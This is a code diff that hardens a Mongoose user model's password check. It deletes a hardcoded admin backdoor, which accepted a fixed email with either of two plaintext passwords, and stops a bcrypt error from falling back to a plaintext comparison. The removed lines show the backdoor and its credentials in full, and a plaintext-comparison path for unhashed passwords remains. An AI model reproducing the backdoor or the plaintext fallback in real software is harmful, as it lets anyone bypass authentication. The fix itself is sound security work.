@@ -59,18 +59,13 @@ userSchema.pre('save', async function (next) {
 userSchema.methods.matchPassword = async function (enteredPassword) {
   if (!this.password) return false;
 
-  // Flexible admin credential check for seamless access
-  if (this.email === 'admin@shahlajuk.com' && (enteredPassword === 'adminpassword' || enteredPassword === '@AdminLajuk')) {
-    return true;
-  }
-
   if (!this.password.startsWith('$2a$') && !this.password.startsWith('$2b$')) {
     return enteredPassword === this.password;
   }
   try {
     return await bcrypt.compare(enteredPassword, this.password);
   } catch {
-    return enteredPassword === this.password;
+    return false;
   }
 };
 
